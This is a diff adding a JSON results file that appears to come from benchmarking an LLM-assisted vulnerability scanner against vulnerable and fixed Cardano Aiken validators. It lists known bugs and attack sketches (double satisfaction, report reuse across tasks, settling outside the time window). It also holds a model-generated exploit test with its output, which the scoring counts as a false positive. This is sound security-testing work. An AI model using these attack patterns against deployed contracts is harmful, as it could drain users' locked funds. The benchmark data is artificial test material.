@@ -1,0 +1,135 @@
+{
+  "generatedAt": "2026-10-06T08:06:44.723Z",
+  "targets": [
+    {
+      "target": "onchain-vulnerable",
+      "source": "cost-of-trust/onchain SECURITY-codex.md and SECURITY-opus.md",
+      "groundTruthBugs": [
+        "critical double satisfaction across vault and coverage outputs",
+        "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
+        "signed report is not bound to the coverage task_ref"
+      ],
+      "candidates": 6,
+      "confirmedFindings": [
+        {
+          "status": "CONFIRMED",
+          "candidate": {
+            "rule": "settle-window",
+            "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/cover.ak",
+            "line": 43,
+            "why": "The time-dependent settle branch has no lower and upper validity-range checks.",
+            "attackSketch": "Submit a validly signed settle report before the intended task window opens or after it closes."
+          },
+          "model": "nvidia/nemotron-3-ultra-550b-a55b:free",
+          "attempts": 3,
+          "testSource": "use aiken/builtin\nuse aiken/collection/list\nuse aiken/interval\nuse cardano/address.{Address, Script, VerificationKey}\nuse cardano/assets\nuse cardano/transaction.{\n  InlineDatum, Input, NoDatum, Output, OutputReference, Transaction,\n}\nuse cot/cover\nuse cot/model.{\n  ConfigDatum, CoverageDatum, CoverageRedeemer, Expire, Settle, config_digest,\n  config_nft_name,\n}\nuse cot/vectors\n\nconst underwriter: ByteArray =\n  #\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\nconst buyer_key: ByteArray =\n  #\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\"\n\nconst stranger_key: ByteArray =\n  #\"cccccccccccccccccccccccccccccccccccccccccccccccccccccccc\"\n\nconst cover_script: ByteArray =\n  #\"dddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n\nconst config_policy: ByteArray =\n  #\"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\"\n\nconst decide_by = 2_000\n\nconst locked = 10_000_000\n\nconst payout = 4_000_000\n\nfn wallet(key: ByteArray) -> Address {\n  Address { payment_credential: VerificationKey(key), stake_credential: None }\n}\n\nfn own_ref() -> OutputReference {\n  OutputReference {\n    transaction_id: vectors.coverage_tx,\n    output_index: vectors.coverage_index,\n  }\n}\n\nfn other_ref() -> OutputReference {\n  OutputReference {\n    transaction_id: #\"4444444444444444444444444444444444444444444444444444444444444444\",\n    output_index: 0,\n  }\n}\n\nfn config() -> ConfigDatum {\n  ConfigDatum {\n    signers: vectors.signers,\n    f: vectors.f,\n    workflow_owner: vectors.owner,\n    workflow_name: vectors.name,\n    workflow_cid: vectors.cid,\n  }\n}\n\nfn datum() -> CoverageDatum {\n  CoverageDatum {\n    terms_hash: vectors.terms_hash,\n    buyer: wallet(buyer_key),\n    underwriter,\n    payout,\n    task_ref: other_ref(),\n    decide_by,\n    config_digest: vectors.config_digest,\n  }\n}\n\nfn cover_input() -> Input {\n  Input {\n    output_reference: own_ref(),\n    output: Output {\n      address: Address {\n        payment_credential: Script(cover_script),\n        stake_credential: None,\n      },\n      value: assets.from_lovelace(locked),\n      datum: InlineDatum(datum()),\n      reference_script: None,\n    },\n  }\n}\n\nfn config_input(cfg: ConfigDatum) -> Input {\n  Input {\n    output_reference: OutputReference {\n      transaction_id: #\"2222222222222222222222222222222222222222222222222222222222222222\",\n      output_index: 0,\n    },\n    output: Output {\n      address: wallet(stranger_key),\n      value: assets.add(\n        assets.from_lovelace(2_000_000),\n        config_policy,\n        config_nft_name,\n        1,\n      ),\n      datum: InlineDatum(cfg),\n      reference_script: None,\n    },\n  }\n}\n\nfn tagged(address: Address, lovelace: Int, tag: OutputReference) -> Output {\n  Output {\n    address,\n    value: assets.from_lovelace(lovelace),\n    datum: InlineDatum(tag),\n    reference_script: None,\n  }\n}\n\nfn failure_outputs() -> List<Output> {\n  [\n    tagged(wallet(buyer_key), payout, own_ref()),\n    tagged(wallet(underwriter), locked - payout, own_ref()),\n  ]\n}\n\nfn success_outputs() -> List<Output> {\n  [tagged(wallet(underwriter), locked, own_ref())]\n}\n\nfn run(\n  cfg: ConfigDatum,\n  redeemer: CoverageRedeemer,\n  outputs: List<Output>,\n  validity: interval.Interval,\n  signatories: List<ByteArray>,\n) -> Bool {\n  cover.validate(\n    config_policy,\n    Some(datum()),\n    redeemer,\n    own_ref(),\n    Transaction {\n      ..transaction.placeholder,\n      inputs: [cover_input()],\n      reference_inputs: [config_input(cfg)],\n      outputs,\n      validity_range: validity,\n      extra_signatories: signatories,\n    },\n  )\n}\n\nfn settle(\n  raw: ByteArray,\n  sigs: List<ByteArray>,\n  pubkeys: List<ByteArray>,\n) -> CoverageRedeemer {\n  Settle { raw_report: raw, report_context: vectors.context, sigs, pubkeys }\n}\n\nfn pick(xs: List<a>, idx: List<Int>) -> List<a> {\n  list.map(\n    idx,\n    fn(i) {\n      expect Some(x) = list.at(xs, i)\n      x\n    },\n  )\n}\n\nfn settle_with(\n  raw: ByteArray,\n  sigs: List<ByteArray>,\n  outputs: List<Output>,\n) -> Bool {\n  run(\n    config(),\n    settle(raw, pick(sigs, [0, 1]), pick(vectors.pubkeys, [0, 1])),\n    outputs,\n    interval.before(2_000),\n    [],\n  )\n}\n\ntest exploit_attack() {\n  // Attack: submit a validly signed settle report before the intended task window opens\n  // (validity range starts at 0, well before decide_by=2000)\n  // The cover validator lacks lower/upper bound checks on the settle branch.\n  settle_with(vectors.report_failure, vectors.sigs_failure, failure_outputs())\n}\n\ntest honest_control() {\n  // Honest transaction: same valid report but with validity range properly bounded\n  // by the decide_by deadline (upper bound before 2000, lower bound at or after 0)\n  run(\n    config(),\n    settle(vectors.report_failure, pick(vectors.sigs_failure, [0, 1]), pick(vectors.pubkeys, [0, 1])),\n    failure_outputs(),\n    interval.between(0, 1_999),\n    [],\n  )\n}\n",
+          "workDir": "/tmp/cot-onchain-ce28fef/onchain/work/5f017f346146946a",
+          "modelAttempts": [
+            {
+              "model": "nvidia/nemotron-3-ultra-550b-a55b:free",
+              "attempts": 3,
+              "compile": "pass",
+              "attack": "pass",
+              "control": "pass",
+              "output": "^D\b\b    Compiling cost-of-trust/onchain 0.1.0 (.)\r\n    Compiling aiken-lang/stdlib v3.0.0 (./build/packages/aiken-lang-stdlib)\r\n   Collecting all tests scenarios across all modules\r\n      Testing ...\r\n\r\n    ┍━ cot/config_test ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem: 200.29 K, cpu:  60.45 M] mint_consuming_the_seed_with_a_valid_config_ok\r\n    │ PASS [mem:  75.73 K, cpu:  21.59 M] mint_without_consuming_the_seed_rejected\r\n    │ PASS [mem:  82.66 K, cpu:  24.86 M] minting_two_nfts_rejected\r\n    │ PASS [mem: 168.85 K, cpu:  50.46 M] mint_with_threshold_above_signer_count_rejected\r\n    │ PASS [mem: 204.73 K, cpu:  61.79 M] mint_with_a_short_workflow_name_rejected\r\n    │ PASS [mem: 112.42 K, cpu:  33.71 M] mint_without_an_inline_config_datum_rejected\r\n    ┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 6 tests | 6 passed | 0 failed\r\n\r\n\r\n    ┍━ cot/cover_test ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem:  34.82 K, cpu:  13.53 M] config_digest_matches_the_generator\r\n    │ PASS [mem: 587.89 K, cpu: 280.66 M] failure_settle_pays_payout_to_buyer_and_rest_to_underwriter\r\n    │ PASS [mem: 431.34 K, cpu: 230.49 M] success_settle_pays_underwriter\r\n    │ PASS [mem: 431.74 K, cpu: 230.61 M] inconclusive_settle_pays_underwriter\r\n    │ PASS [mem: 412.97 K, cpu: 223.32 M] success_settle_paying_buyer_instead_rejected\r\n    │ PASS [mem: 939.70 K, cpu: 445.44 M] one_flipped_byte_in_raw_report_rejected\r\n    │ PASS [mem: 305.45 K, cpu:  96.78 M] f_signatures_not_f_plus_one_rejected\r\n    │ PASS [mem: 625.35 K, cpu: 291.74 M] f_plus_one_signatures_accepted_from_any_two_signers\r\n    │ PASS [mem: 375.31 K, cpu: 171.35 M] duplicate_signer_counted_twice_rejected\r\n    │ PASS [mem: 338.52 K, cpu: 160.79 M] non_allowlisted_signer_rejected\r\n    │ PASS [mem: 393.54 K, cpu: 219.62 M] signature_from_a_different_key_than_the_pubkey_rejected\r\n    │ PASS [mem: 412.48 K, cpu: 225.65 M] body_for_a_different_coverage_out_ref_rejected\r\n    │ PASS [mem: 416.25 K, cpu: 226.92 M] body_for_a_different_coverage_index_rejected\r\n    │ PASS [mem: 409.95 K, cpu: 224.87 M] wrong_terms_hash_rejected\r\n    │ PASS [mem: 403.65 K, cpu: 222.80 M] wrong_workflow_name_rejected\r\n    │ PASS [mem: 397.84 K, cpu: 220.79 M] unknown_decision_byte_rejected\r\n    │ PASS [mem: 505.81 K, cpu: 257.52 M] failure_paying_buyer_less_than_payout_rejected\r\n    │ PASS [mem: 587.13 K, cpu: 280.41 M] failure_paying_underwriter_less_than_remainder_rejected\r\n    │ PASS [mem: 493.99 K, cpu: 253.98 M] payout_tagged_for_another_coverage_rejected\r\n    │ PASS [mem: 490.63 K, cpu: 252.89 M] untagged_payout_rejected\r\n    │ PASS [mem: 297.69 K, cpu:  94.46 M] config_digest_not_matching_the_pinned_digest_rejected\r\n    │ PASS [mem: 120.56 K, cpu:  36.30 M] expire_before_decide_by_rejected\r\n    │ PASS [mem: 184.22 K, cpu:  58.40 M] expire_after_decide_by_by_underwriter_ok\r\n    │ PASS [mem: 128.63 K, cpu:  39.16 M] expire_unsigned_rejected\r\n    │ PASS [mem: 165.85 K, cpu:  51.22 M] expire_without_returning_collateral_rejected\r\n    ┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 25 tests | 25 passed | 0 failed\r\n\r\n\r\n    ┍━ cot/vault_test ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem: 149.00 K, cpu:  48.60 M] claim_before_expiry_pays_beneficiary\r\n    │ PASS [mem:  95.23 K, cpu:  31.38 M] claim_after_expiry_rejected\r\n    │ PASS [mem: 100.48 K, cpu:  33.15 M] claim_at_the_expiry_instant_rejected\r\n    │ PASS [mem:  91.68 K, cpu:  30.35 M] claim_without_upper_bound_rejected\r\n    │ PASS [mem: 133.76 K, cpu:  44.10 M] claim_paying_someone_else_rejected\r\n    │ PASS [mem: 166.61 K, cpu:  54.67 M] claim_underpaying_beneficiary_rejected\r\n    │ PASS [mem: 206.40 K, cpu:  66.45 M] claim_two_vaults_with_one_payment_rejected\r\n    │ PASS [mem: 207.26 K, cpu:  66.72 M] claim_two_vaults_with_full_payment_ok\r\n    │ PASS [mem:  99.95 K, cpu:  32.99 M] forfeit_before_expiry_rejected\r\n    │ PASS [mem: 157.27 K, cpu:  51.48 M] forfeit_after_expiry_by_sponsor_ok\r\n    │ PASS [mem: 107.73 K, cpu:  35.80 M] forfeit_unsigned_rejected\r\n    │ PASS [mem: 142.03 K, cpu:  46.98 M] forfeit_not_returned_to_sponsor_rejected\r\n    │ PASS [mem:  43.40 K, cpu:  13.26 M] spending_without_a_datum_fails\r\n    │ · with traces\r\n    │ | the validator crashed / exited prematurely\r\n    │ | expect Some(d) = datum\r\n    ┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 13 tests | 13 passed | 0 failed\r\n\r\n\r\n    ┍━ security_exploit_generated_test ━━━━━━━━━━━━━━━━━\r\n    │ PASS [mem: 587.89 K, cpu: 280.66 M] exploit_attack\r\n    │ PASS [mem: 590.75 K, cpu: 281.43 M] honest_control\r\n    ┕━━━━━━━━━━━━━━━━━━━━━ 2 tests | 2 passed | 0 failed\r\n\r\n\r\n\r\n  ⚠ I discovered an unused imported value: NoDatum\r\n   ╭─[./lib/security_exploit_generated_test.ak:7:23]\r\n 6 │ use cardano/transaction.{\r\n 7 │   InlineDatum, Input, NoDatum, Output, OutputReference, Transaction,\r\n   ·                       ───┬───\r\n   ·                          ╰── unused import\r\n 8 │ }\r\n   ╰────\r\n  help: No big deal, but you might want to remove it to get rid of that\r\n        warning.\r\n\r\n\r\n  ⚠ I discovered an unused imported value: config_digest\r\n    ╭─[./lib/security_exploit_generated_test.ak:11:65]\r\n 10 │ use cot/model.{\r\n 11 │   ConfigDatum, CoverageDatum, CoverageRedeemer, Expire, Settle, config_digest,\r\n    ·                                                                 ──────┬──────\r\n    ·                                                                       ╰── unused import\r\n 12 │   config_nft_name,\r\n    ╰────\r\n  help: No big deal, but you might want to remove it to get rid of that\r\n        warning.\r\n\r\n\r\n  ⚠ I discovered an unused imported value: Expire\r\n    ╭─[./lib/security_exploit_generated_test.ak:11:49]\r\n 10 │ use cot/model.{\r\n 11 │   ConfigDatum, CoverageDatum, CoverageRedeemer, Expire, Settle, config_digest,\r\n    ·                                                 ───┬──\r\n    ·                                                    ╰── unused import\r\n 12 │   config_nft_name,\r\n    ╰────\r\n  help: No big deal, but you might want to remove it to get rid of that\r\n        warning.\r\n\r\n\r\n  ⚠ I found an unused private function: success_outputs\r\n     ╭─[./lib/security_exploit_generated_test.ak:128:1]\r\n 127 │ \r\n 128 │ fn success_outputs() -> List<Output> {\r\n     · ──────────────────┬─────────────────\r\n     ·                   ╰── unused (private) function\r\n 129 │   [tagged(wallet(underwriter), locked, own_ref())]\r\n     ╰────\r\n  help: Perhaps your forgot to make it public using the pub keyword?\r\n        Otherwise, you might want to get rid of it altogether.\r\n\r\n\r\n  ⚠ I discovered an unused imported module: builtin\r\n   ╭─[./lib/security_exploit_generated_test.ak:1:1]\r\n 1 │ use aiken/builtin\r\n   · ────────┬────────\r\n   ·         ╰── unused module\r\n 2 │ use aiken/collection/list\r\n   ╰────\r\n  help: No big deal, but you might want to remove it to get rid of that\r\n        warning.\r\n\r\n      Summary 46 checks, 0 errors, 5 warnings\r\n\n"
+            }
+          ]
+        }
+      ],
+      "needsReview": [
+        {
+          "rule": "missing-task-binding",
+          "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/cover.ak",
+          "line": 27,
+          "why": "The datum carries the insured task reference, but the report is only checked against the coverage UTxO.",
+          "attackSketch": "Reuse a genuine report for another task while presenting the current coverage reference.",
+          "status": "needs review"
+        },
+        {
+          "rule": "double-satisfaction",
+          "file": "/tmp/cot-onchain-ce28fef/onchain/lib/cot/vault.ak",
+          "line": 26,
+          "why": "A payout is selected without binding it to the consumed script input and there is no single-script-input guard.",
+          "attackSketch": "Spend two script inputs in one transaction and make one payout satisfy both validators' value checks.",
+          "status": "needs review"
+        }
+      ],
+      "groundTruthCount": 3,
+      "known": [
+        "critical double satisfaction across vault and coverage outputs",
+        "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
+        "signed report is not bound to the coverage task_ref"
+      ],
+      "expectedNoConfirmed": false,
+      "matchedFindings": 0,
+      "recall": 0,
+      "falsePositives": 1,
+      "elapsedMs": 265816,
+      "llmCalls": 0
+    },
+    {
+      "target": "onchain-fixed",
+      "source": "cost-of-trust/onchain SECURITY-FIXED.md",
+      "groundTruthBugs": [
+        "critical double satisfaction across vault and coverage outputs",
+        "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
+        "signed report is not bound to the coverage task_ref"
+      ],
+      "candidates": 0,
+      "confirmedFindings": [],
+      "needsReview": [],
+      "groundTruthCount": 3,
+      "known": [
+        "critical double satisfaction across vault and coverage outputs",
+        "Settle accepts a report after decide_by or an early INCONCLUSIVE report",
+        "signed report is not bound to the coverage task_ref"
+      ],
+      "expectedNoConfirmed": true,
+      "matchedFindings": 0,
+      "recall": 0,
+      "falsePositives": 0,
+      "elapsedMs": 5,
+      "llmCalls": 0
+    },
+    {
+      "target": "01_sell_nft",
+      "source": "README.md",
+      "groundTruthBugs": [
+        "one payment can satisfy multiple NFT sale outputs"
+      ],
+      "candidates": 0,
+      "confirmedFindings": [],
+      "needsReview": [],
+      "groundTruthCount": 1,
+      "known": [
+        "one payment can satisfy multiple NFT sale outputs"
+      ],
+      "expectedNoConfirmed": false,
+      "matchedFindings": 0,
+      "recall": 0,
+      "falsePositives": 0,
+      "elapsedMs": 3,
+      "llmCalls": 0
+    },
+    {
+      "target": "bank_01_deposit_vulnerability",
+      "source": "README.md",
+      "groundTruthBugs": [
+        "deposit into another account can take control of its funds"
+      ],
+      "candidates": 0,
+      "confirmedFindings": [],
+      "needsReview": [],
+      "groundTruthCount": 1,
+      "known": [
+        "deposit into another account can take control of its funds"
+      ],
+      "expectedNoConfirmed": false,
+      "matchedFindings": 0,
+      "recall": 0,
+      "falsePositives": 0,
+      "elapsedMs": 2,
+      "llmCalls": 0
+    }
+  ]
+}
